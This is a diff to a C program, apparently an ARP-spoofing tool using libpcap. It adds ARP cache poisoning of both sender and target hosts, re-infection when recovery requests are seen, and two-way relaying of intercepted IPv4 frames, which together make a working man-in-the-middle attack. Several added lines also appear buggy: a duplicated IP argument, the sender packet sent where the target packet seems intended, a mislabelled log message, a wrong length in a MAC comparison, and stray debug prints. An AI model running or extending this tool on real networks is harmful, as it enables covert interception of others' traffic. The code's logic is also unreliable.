@@ -150,6 +150,7 @@ int main(int argc, char* argv[])
     arp_packet arp_packet_deceive_sender[101];
     for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
         arp_packet_deceive_sender[now_pair] = arp_reply_target_ip_with_attacker_mac(attacker_mac, sender_mac[now_pair], target_ip[now_pair], sender_ip[now_pair]);
+        arp_packet_deceive_target[now_pair] = arp_reply_target_ip_with_attacker_mac(attacker_mac, target_mac[now_pair], sender_ip[now_pair], sender_ip[now_pair]);
     }
 
     while(true) {
@@ -162,6 +163,12 @@ int main(int argc, char* argv[])
                         need_arp_spoof_reinfect = true;
                     }
                     else printf("[Success] pair %d's Sender Time Infect Packet Sent Successfully.\n", now_pair + 1);
+                    if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_target[now_pair]), ARP_PACKET_LEN) != 0){
+                        printf("[Error] pair %d's Target Time Infect Packet Sending Failed.\n", now_pair + 1);
+                        need_arp_spoof_reinfect_packet[now_pair] = true;
+                        need_arp_spoof_reinfect = true;
+                    }
+                    else printf("[Success] pair %d's Sender Time Infect Packet Sent Successfully.\n", now_pair + 1);
                 }
                 time_arp_spoof_reinfect = false;
             }
@@ -170,11 +177,19 @@ int main(int argc, char* argv[])
                     if(need_arp_spoof_reinfect_packet[now_pair] == true){ // only re-infect pair that needs re-inject
                         if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender[now_pair]), ARP_PACKET_LEN) != 0){
                             printf("[Error] pair %d's Sender Infect Packet Sending Failed.\n", now_pair + 1);
-                            need_arp_spoof_reinfect_packet[now_pair] = true;
+                            flg = true;
                         }
                         else{
                             printf("[Success] pair %d's Sender Infect Packet Sent Successfully.\n", now_pair + 1);
-                            need_arp_spoof_reinfect_packet[now_pair] = false;
+                            flg = false;
+                        }
+                        if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender[now_pair]), ARP_PACKET_LEN) != 0){
+                            printf("[Error] pair %d's Target Infect Packet Sending Failed.\n", now_pair + 1);
+                            need_arp_spoof_reinfect_packet[now_pair] = true;
+                        }
+                        else{
+                            printf("[Success] pair %d's Target Infect Packet Sent Successfully.\n", now_pair + 1);
+                            need_arp_spoof_reinfect_packet[now_pair] = flg;
                         }
                     }
                 }
@@ -248,6 +263,19 @@ int main(int argc, char* argv[])
                                     }
                                 }
                             }
+                                // 4. recovery: target -> sender ip & attacker mac (unicast) ask
+                            else if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == SAME){ // check sender ip addr
+                                printf("st check1\n");
+                                if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == SAME){ // check target ip addr
+                                    printf("st check2\n");
+                                    if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, attacker_mac, MAC_address_length) == SAME){
+                                        printf("[Detected] ARP Request from target to sender (unicast).\n");
+                                        need_arp_spoof_reinfect = true;
+                                        need_arp_spoof_reinfect_packet[now_pair] = true;
+                                        break;
+                                    }
+                                }
+                            }
                             else {}
                         }
                         else if(ntohs(*((uint16_t *)(packet + ARP_OPCODE))) == ARP_operation_reply) {}
@@ -260,12 +288,25 @@ int main(int argc, char* argv[])
                         
                     if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_IPv4){
                         if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, attacker_mac, IPv4_address_length) == SAME){
+                                // sender -> target relay
                             if(memcmp((uint8_t *)packet + IPv4_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == SAME){ // check target ip addr
                                 uint8_t * now_packet = (uint8_t *) packet;
                                     // while packet relaying, we only change mac addr
                                         // src_mac = sender, dst_mac = attacker => src_mac = attacker, dst_mac = target
                                 copy_6byte(attacker_mac, now_packet + ETHERNET_SOURCE_MAC_ADDR);
                                 copy_6byte(target_mac[now_pair], now_packet + ETHERNET_DESTINATION_MAC_ADDR);
+                                if(pcap_sendpacket(handle, now_packet, header->caplen) != 0){ // send packet attacker -> target
+                                    printf("[Error] pair %d's Packet Relay Failed.\n", now_pair);
+                                } 
+                                break;
+                            }
+                                // target -> sender relay
+                            else if(memcmp((uint8_t *)packet + IPv4_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == SAME){ // check sender ip addr
+                                uint8_t * now_packet = (uint8_t *) packet;
+                                    // while packet relaying, we only change mac addr
+                                        // src_mac = target, dst_mac = attacker => src_mac = attacker, dst_mac = sender
+                                copy_6byte(attacker_mac, now_packet + ETHERNET_SOURCE_MAC_ADDR);
+                                copy_6byte(sender_mac[now_pair], now_packet + ETHERNET_DESTINATION_MAC_ADDR);
                                 if(pcap_sendpacket(handle, now_packet, header->caplen) != 0){ // send packet attacker -> target
                                     printf("[Error] pair %d's Packet Relay Failed.\n", now_pair);
                                 } 
